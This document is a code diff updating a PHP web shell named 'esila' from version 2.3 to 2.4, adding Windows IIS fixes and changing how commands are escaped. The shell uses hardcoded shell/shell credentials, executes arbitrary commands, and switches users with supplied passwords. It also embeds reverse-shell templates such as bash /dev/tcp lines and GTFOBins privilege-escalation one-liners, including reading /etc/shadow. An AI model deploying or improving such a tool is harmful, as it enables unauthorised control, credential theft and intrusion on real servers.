@@ -7,14 +7,21 @@ if (!function_exists('str_contains')) { function str_contains($h,$n){return $n==
 if (!function_exists('str_starts_with')) { function str_starts_with($h,$n){return $n===''||strncmp($h,$n,strlen($n))===0;} }
 if (!function_exists('array_key_first')) { function array_key_first($a){foreach($a as $k=>$v)return $k;return null;} }
 
-// Session hardening
+// Session hardening - Windows IIS often has broken session save path
+if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+    $sp = @session_save_path();
+    if (!$sp || !@is_writable($sp)) {
+        $tmp = getenv('TEMP') ?: (getenv('TMP') ?: 'C:\\Windows\\Temp');
+        if (@is_writable($tmp)) @session_save_path($tmp);
+    }
+}
 if(!headers_sent()){@session_start();}
 if(!isset($_SESSION)){$_SESSION=array();}
 
 define('IS_WIN', strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
 define('DEFAULT_USER', 'shell');
 define('DEFAULT_PASS', 'shell');
-define('VERSION', '2.3');
+define('VERSION', '2.4');
 
 // Universal command execution - tries multiple methods
 function esila_exec($cmd) {
@@ -90,10 +97,9 @@ if (isset($_GET['download'])) {
 if (!isset($_SESSION['logged_in']) && isset($_COOKIE['esila_auth'])) {
     if ($_COOKIE['esila_auth'] === md5(DEFAULT_USER . ':' . DEFAULT_PASS)) {
         $_SESSION['logged_in'] = true;
-        $_SESSION['cwd'] = getcwd();
+        $_SESSION['cwd'] = getcwd() ?: (IS_WIN ? 'C:\\' : '/');
         $_SESSION['history'] = array();
     }
-    exit;
 }
 
 // Login
@@ -101,7 +107,7 @@ if (!isset($_SESSION['logged_in'])) {
     if (isset($_POST['username']) && isset($_POST['password'])) {
         if ($_POST['username'] === DEFAULT_USER && $_POST['password'] === DEFAULT_PASS) {
             $_SESSION['logged_in'] = true;
-            $_SESSION['cwd'] = getcwd();
+            $_SESSION['cwd'] = getcwd() ?: (IS_WIN ? 'C:\\' : '/');
             $_SESSION['history'] = array();
             @setcookie('esila_auth', md5(DEFAULT_USER . ':' . DEFAULT_PASS), time() + 86400, '/');
             header('Location: ?');
@@ -184,7 +190,7 @@ function fixHtaccess(mode) {
 }
 
 // Authenticated API endpoints
-if (!isset($_SESSION['cwd'])) $_SESSION['cwd'] = getcwd();
+if (!isset($_SESSION['cwd'])) $_SESSION['cwd'] = getcwd() ?: (IS_WIN ? 'C:\\' : '/');
 if (!isset($_SESSION['history'])) $_SESSION['history'] = [];
 $cwd = $_SESSION['cwd'];
 
@@ -240,7 +246,10 @@ if (isset($_POST['action']) && $_POST['action'] === 'switch_user') {
     if (IS_WIN) {
         $tmp = getenv('TEMP') ?: (getenv('TMP') ?: 'C:\\Windows\\Temp');
         $tmpf = $tmp . '\\esila_su_' . mt_rand(1000,9999) . '.txt';
-        $test = esila_exec('powershell -c "$p=ConvertTo-SecureString ' . escapeshellarg($su_pass) . ' -AsPlainText -Force;$c=New-Object System.Management.Automation.PSCredential(' . escapeshellarg($su_user) . ',$p);Start-Process cmd -Credential $c -ArgumentList \'/c whoami\' -NoNewWindow -Wait -RedirectStandardOutput ' . escapeshellarg($tmpf) . ' 2>&1;Get-Content ' . escapeshellarg($tmpf) . ';Remove-Item ' . escapeshellarg($tmpf) . ' -Force" 2>&1');
+        $ps_pass = str_replace("'", "''", $su_pass);
+        $ps_user = str_replace("'", "''", $su_user);
+        $ps_tmpf = str_replace("'", "''", $tmpf);
+        $test = esila_exec("powershell -c \"\\$p=ConvertTo-SecureString '$ps_pass' -AsPlainText -Force;\\$c=New-Object System.Management.Automation.PSCredential('$ps_user',\\$p);Start-Process cmd -Credential \\$c -ArgumentList '/c whoami' -NoNewWindow -Wait -RedirectStandardOutput '$ps_tmpf' 2>&1;Get-Content '$ps_tmpf';Remove-Item '$ps_tmpf' -Force\" 2>&1");
     } else {
         $test = esila_exec('echo ' . escapeshellarg($su_pass) . ' | su - ' . escapeshellarg($su_user) . ' -c "whoami" 2>&1');
         if (strpos($test, $su_user) === false) {
@@ -290,7 +299,12 @@ if (isset($_POST['cmd'])) {
             $r = mt_rand(1000,9999);
             $outf = $tmp . '\\esila_o' . $r . '.txt';
             $errf = $tmp . '\\esila_e' . $r . '.txt';
-            $exec = 'powershell -c "$p=ConvertTo-SecureString ' . escapeshellarg($su_pass) . ' -AsPlainText -Force;$c=New-Object System.Management.Automation.PSCredential(' . escapeshellarg($su_user) . ',$p);Start-Process cmd -Credential $c -ArgumentList \'/c ' . addslashes($basecmd) . '\' -NoNewWindow -Wait -RedirectStandardOutput ' . escapeshellarg($outf) . ' -RedirectStandardError ' . escapeshellarg($errf) . ';Get-Content ' . escapeshellarg($outf) . ',' . escapeshellarg($errf) . ';Remove-Item ' . escapeshellarg($outf) . ',' . escapeshellarg($errf) . ' -Force -ErrorAction SilentlyContinue" 2>&1';
+            $ps_pass = str_replace("'", "''", $su_pass);
+            $ps_user = str_replace("'", "''", $su_user);
+            $ps_outf = str_replace("'", "''", $outf);
+            $ps_errf = str_replace("'", "''", $errf);
+            $ps_cmd = str_replace("'", "''", $basecmd);
+            $exec = "powershell -c \"\\$p=ConvertTo-SecureString '$ps_pass' -AsPlainText -Force;\\$c=New-Object System.Management.Automation.PSCredential('$ps_user',\\$p);Start-Process cmd -Credential \\$c -ArgumentList '/c $ps_cmd' -NoNewWindow -Wait -RedirectStandardOutput '$ps_outf' -RedirectStandardError '$ps_errf';Get-Content '$ps_outf','$ps_errf';Remove-Item '$ps_outf','$ps_errf' -Force -ErrorAction SilentlyContinue\" 2>&1";
         } else {
             $exec = 'echo ' . escapeshellarg($su_pass) . ' | sudo -S -u ' . escapeshellarg($su_user) . ' bash -c ' . escapeshellarg($basecmd) . ' 2>&1';
         }
@@ -904,18 +918,23 @@ body::before { content:''; position:fixed; inset:0; background-image:radial-grad
 
 <script>
 // ===== GLOBALS =====
-const USERNAME = <?= json_encode($username) ?>;
-const HOSTNAME = <?= json_encode($hostname) ?>;
-const HOME = <?= json_encode($home) ?>;
-let CWD = <?= json_encode($cwd) ?>;
-let cmdHistory = <?= json_encode($history) ?>;
-let historyIdx = cmdHistory.length;
-let currentLine = '';
-let fmCurrentPath = CWD;
-let editingFile = '';
-let activeRsTab = 'reverse';
-let activeGtfoFilter = 'all';
-let expandedGtfo = null;
+var USERNAME = <?= json_encode($username) ?>;
+var HOSTNAME = <?= json_encode($hostname) ?>;
+var HOME = <?= json_encode($home) ?>;
+var _cwd_val = <?= json_encode($cwd) ?>;
+Object.defineProperty(window, 'CWD', {
+    get: function() { return _cwd_val; },
+    set: function(v) { _cwd_val = v; var p = document.getElementById('tb-path'); if (p) p.textContent = v; if (typeof updateInputPrompt === 'function') updateInputPrompt(); },
+    configurable: true
+});
+var cmdHistory = <?= json_encode($history) ?>;
+var historyIdx = cmdHistory.length;
+var currentLine = '';
+var fmCurrentPath = CWD;
+var editingFile = '';
+var activeRsTab = 'reverse';
+var activeGtfoFilter = 'all';
+var expandedGtfo = null;
 
 // ===== UTILITIES =====
 function $(id) { return document.getElementById(id); }
@@ -928,12 +947,14 @@ function copyText(text) {
         const ta = document.createElement('textarea'); ta.value = text; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); toast('Copied!');
     });
 }
-function esc(s) { const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
+function esc(s) { var d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
+function escJs(s) { return String(s).replace(/\\/g, '\\\\').replace(/'/g, "\\'"); }
 function formatBytes(b) { if (b === 0) return '0 B'; const k = 1024, s = ['B','KB','MB','GB']; const i = Math.floor(Math.log(b)/Math.log(k)); return parseFloat((b/Math.pow(k,i)).toFixed(1)) + ' ' + s[i]; }
 async function api(data) {
-    const fd = new FormData();
-    for (const [k,v] of Object.entries(data)) fd.append(k, v);
-    const r = await fetch(window.location.href, { method: 'POST', body: fd });
+    var fd = new FormData();
+    var keys = Object.keys(data);
+    for (var ki = 0; ki < keys.length; ki++) fd.append(keys[ki], data[keys[ki]]);
+    var r = await fetch(window.location.href, { method: 'POST', body: fd });
     return r;
 }
 async function apiJson(data) { return (await api(data)).json(); }
@@ -1052,7 +1073,7 @@ function termExec(cmd) {
 }
 
 // ===== REVERSE SHELL DATA =====
-const RS_DATA = {
+var RS_DATA = {
 reverse: [
     {name:'Bash -i',lang:'Bash',os:'linux',cmd:'{shell} -i >& /dev/tcp/{ip}/{port} 0>&1'},
     {name:'Bash 196',lang:'Bash',os:'linux',cmd:'0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196'},
@@ -1177,7 +1198,7 @@ function renderRsGrid() {
 renderRsGrid();
 
 // ===== GTFOBINS DATA =====
-const GTFO_DATA = [
+var GTFO_DATA = [
     {name:'awk',cats:['sudo','suid','reverse-shell'],cmds:{sudo:'sudo awk \'BEGIN {system("/bin/sh")}\'',suid:'./awk \'BEGIN {system("/bin/sh")}\'','reverse-shell':'awk \'BEGIN {s="/inet/tcp/0/{ip}/{port}";while(42){do{printf "shell>"|&s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit")close(s)}}\''}},
     {name:'base64',cats:['file-read','suid'],cmds:{'file-read':'base64 /etc/shadow | base64 -d',suid:'./base64 /etc/shadow | base64 -d'}},
     {name:'bash',cats:['sudo','suid','reverse-shell'],cmds:{sudo:'sudo bash',suid:'bash -p','reverse-shell':'bash -i >& /dev/tcp/{ip}/{port} 0>&1'}},
@@ -1306,13 +1327,14 @@ async function loadFileManager(path) {
     const data = await apiJson({action:'filemanager', path});
     if (data.error) { toast(data.error, 'error'); return; }
     fmCurrentPath = data.path;
-    let bc = '<span onclick="loadFileManager(\'/\')">/</span>';
-    const parts = data.path.split(/[\/\\]/).filter(Boolean);
-    let acc = '';
-    for (const p of parts) {
-        acc += '/' + p;
-        let accCopy = acc;
-        bc += ' / <span onclick="loadFileManager(\'' + esc(accCopy) + '\')">' + esc(p) + '</span>';
+    var isWinPath = data.path.length >= 2 && data.path[1] === ':';
+    var bc = isWinPath ? '' : '<span onclick="loadFileManager(\'/\')">/</span>';
+    var parts = data.path.split(/[\/\\]/).filter(Boolean);
+    var acc = '';
+    for (var pi = 0; pi < parts.length; pi++) {
+        var p = parts[pi];
+        acc += (pi === 0 && isWinPath ? '' : (isWinPath ? '\\' : '/')) + p;
+        bc += ' ' + (isWinPath ? '\\' : '/') + ' <span onclick="loadFileManager(\'' + escJs(acc) + '\')">' + esc(p) + '</span>';
     }
     $('fm-breadcrumb').innerHTML = bc;
     let html = '<table class="fm-table"><thead><tr><th>Name</th><th>Size</th><th>Permissions</th><th>Modified</th><th>Actions</th></tr></thead><tbody>';
@@ -1323,13 +1345,18 @@ async function loadFileManager(path) {
         return a.name.localeCompare(b.name);
     }).forEach(f => {
         const icon = f.is_dir ? '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#d29922" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>' : '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--text-secondary)" stroke-width="2"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg>';
-        html += `<tr>
-            <td><div class="fname" onclick="${f.is_dir ? `loadFileManager('${esc(f.path)}')` : `fmViewFile('${esc(f.path)}')`}">${icon} ${esc(f.name)}</div></td>
-            <td style="color:var(--text-secondary);font-size:12px">${f.is_dir ? '-' : formatBytes(f.size)}</td>
-            <td style="font-family:var(--font-mono);font-size:12px;color:${f.writable ? 'var(--green)' : 'var(--text-dim)'}">${f.perms}</td>
-            <td style="color:var(--text-secondary);font-size:12px">${f.mtime}</td>
-            <td style="white-space:nowrap">${f.name !== '..' ? `<button class="btn btn-sm" onclick="fmRename('${esc(f.path)}','${esc(f.name)}')">Ren</button> <button class="btn btn-sm btn-danger" onclick="fmDelete('${esc(f.path)}','${esc(f.name)}')">Del</button> ${!f.is_dir ? `<a class="btn btn-sm" href="?download=${encodeURIComponent(f.path)}" style="text-decoration:none">DL</a>` : ''}` : ''}</td>
-        </tr>`;
+        html += '<tr>';
+        html += '<td><div class="fname" onclick="' + (f.is_dir ? "loadFileManager('" + escJs(f.path) + "')" : "fmViewFile('" + escJs(f.path) + "')") + '">' + icon + ' ' + esc(f.name) + '</div></td>';
+        html += '<td style="color:var(--text-secondary);font-size:12px">' + (f.is_dir ? '-' : formatBytes(f.size)) + '</td>';
+        html += '<td style="font-family:var(--font-mono);font-size:12px;color:' + (f.writable ? 'var(--green)' : 'var(--text-dim)') + '">' + f.perms + '</td>';
+        html += '<td style="color:var(--text-secondary);font-size:12px">' + f.mtime + '</td>';
+        html += '<td style="white-space:nowrap">';
+        if (f.name !== '..') {
+            html += '<button class="btn btn-sm" onclick="fmRename(\'' + escJs(f.path) + '\',\'' + escJs(f.name) + '\')">Ren</button> ';
+            html += '<button class="btn btn-sm btn-danger" onclick="fmDelete(\'' + escJs(f.path) + '\',\'' + escJs(f.name) + '\')">Del</button> ';
+            if (!f.is_dir) html += '<a class="btn btn-sm" href="?download=' + encodeURIComponent(f.path) + '" style="text-decoration:none">DL</a>';
+        }
+        html += '</td></tr>';
     });
     html += '</tbody></table>';
     $('fm-content').innerHTML = html;
@@ -1471,13 +1498,7 @@ updateClock(); setInterval(updateClock, 1000);
     if (el) el.textContent = 'Inline terminal (standalone)';
 })();
 
-// Update topbar path when CWD changes
-let _cwd = CWD;
-Object.defineProperty(window, 'CWD', {
-    get() { return _cwd; },
-    set(v) { _cwd = v; var p = $('tb-path'); if (p) p.textContent = v; updateInputPrompt(); }
-});
-CWD = _cwd;
+// CWD property defined at top with auto-update of topbar + prompt
 
 // GTFOBins: add data attributes for colored left borders
 function addGtfoDataAttrs() {
@@ -1490,7 +1511,7 @@ function addGtfoDataAttrs() {
         else if (text.includes('sudo')) card.setAttribute('data-has-sudo','');
     });
 }
-const _origRenderGtfo = renderGtfoGrid;
+var _origRenderGtfo = renderGtfoGrid;
 renderGtfoGrid = function() { _origRenderGtfo(); addGtfoDataAttrs(); };
 renderGtfoGrid();
 
